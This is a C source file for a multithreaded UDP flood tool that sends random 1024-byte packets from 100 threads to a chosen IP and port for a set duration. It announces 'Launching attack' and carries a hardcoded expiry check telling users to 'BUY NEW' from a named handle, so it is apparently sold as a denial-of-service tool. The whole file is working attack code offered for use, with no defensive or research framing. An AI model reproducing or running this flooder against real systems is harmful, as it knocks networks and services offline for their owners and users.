#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_THREADS 100
#define PAYLOAD_SIZE 1024  // Optimal payload size for most networks

// Expiry date (Format: YYYY-MM-DD)
#define EXPIRY_DATE "2095-08-9"

// Define the AttackParams structure
typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Function to check if the current date is past the expiry date
int is_expired() {
    struct tm expiry_tm = {0};
    struct tm current_tm = {0};

    // Set the expiry date (hardcoded)
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    // Get the current date
    time_t now = time(NULL);
    localtime_r(&now, &current_tm);

    // Compare current date with expiry date
    if (difftime(mktime(&current_tm), mktime(&expiry_tm)) > 0) {
        return 1;  // Expired
    }
    return 0;  // Not expired
}

// Function to generate a powerful, randomized payload
void generate_payload(char* payload, int size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?;:,.";
    for (int i = 0; i < size - 1; i++) {
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    payload[size - 1] = '\0'; // Null-terminate the payload string
}

// Callback function for libcurl to discard the response body
size_t discard_response(void* ptr, size_t size, size_t nmemb, void* userdata) {
    return size * nmemb;
}

// Thread function to send payload
void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    // Generate a powerful randomized payload
    generate_payload(payload, PAYLOAD_SIZE);

    sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            continue; // Retry instead of breaking
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Main function
int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    // Check if the program is expired
    if (is_expired()) {
        printf("BUY NEW FROM @IPxKINGYT\n");
        return 1;
    }

    AttackParams params;
    strcpy(params.ip, argv[1]);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];

    printf("Launching attack on %s:%d for %d seconds with %d threads and payload size %d bytes...\n",
           params.ip, params.port, params.duration, MAX_THREADS, PAYLOAD_SIZE);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed on %s:%d for %d seconds.\n",
           params.ip, params.port, params.duration);

    return 0;
}
